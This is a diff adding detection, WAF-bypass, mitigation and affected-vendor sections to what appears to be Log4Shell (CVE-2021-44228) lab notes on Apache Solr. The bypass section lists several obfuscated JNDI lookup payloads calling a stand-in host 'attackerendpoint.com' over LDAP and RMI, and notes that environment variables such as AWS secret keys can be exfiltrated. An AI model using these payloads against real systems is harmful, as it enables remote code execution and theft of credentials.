@@ -110,3 +110,58 @@ public class Exploit {
 
 ## The attack chain should be like the below image:
 ![Log4j Exploitation Sequence](Log4j-Exploitation-Sequence.jpg)
+
+# Detection
+## Resources:
+1. (local, based off hashes of log4j JAR files) https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
+2. (local, based off hashes of log4j CLASS files) https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
+3. (listing of vulnerable JAR and CLASS hashes) https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228
+4. (local, hunting for vulnerable log4j packages in PowerShell) https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
+5. (local, YARA rules) https://github.com/darkarnium/CVE-2021-44228
++
+## Reddit log4j thread
+https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
+
+# Bypassing
+## the payload we used is a standard and would be blocked by WAFs
+## the payload can be obfuscated using all the features of:
+1. expansion
+2. substituion
+3. templating
+## that the package makes available
+
+## several bypass techniques include:
+- `${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}`
+- `${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}`
+- `${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}`
+- `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}`
+- `${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}`
+- `${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}`
+- `${${::-j}ndi:rmi://attackerendpoint.com/}`
+
+## noting that the last two techniques use the `rmi://` protocol which is also valid and can be used with the `marshalsec` utility
+## additionally, log4j can expand environent variables to exfiltrate dangerous information like `${env:AWS_SECRET_ACCESS_KEY}`
+
+# Mitigation
+## Link for Apache Solr: https://solr.apache.org/security.html
+## we have to add the below line to `/etc/default/solr.in.sh`
+`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`
+## and restart the Apache Solr Service:
+`sudo /etc/init.d/solr restart`
+
+# Other affected Services:
+https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/#affected-products
+## Including Oracle
+https://www.oracle.com/security-alerts/alert-cve-2021-44228.html
+## And Sophos
+https://www.sophos.com/en-us/security-advisories/sophos-sa-20211210-log4j-rce
+## ManageEngine
+https://pitstop.manageengine.com/portal/en/community/topic/log4j-ad-manager-plus
+## Citrix
+https://support.citrix.com/article/CTX335705
+## Fortinet
+https://www.fortiguard.com/psirt/FG-IR-21-245
+## VMware
+https://kb.vmware.com/s/article/87068?lang=en_US
+## Openfire
+https://discourse.igniterealtime.org/t/openfire-4-6-5-released/91108
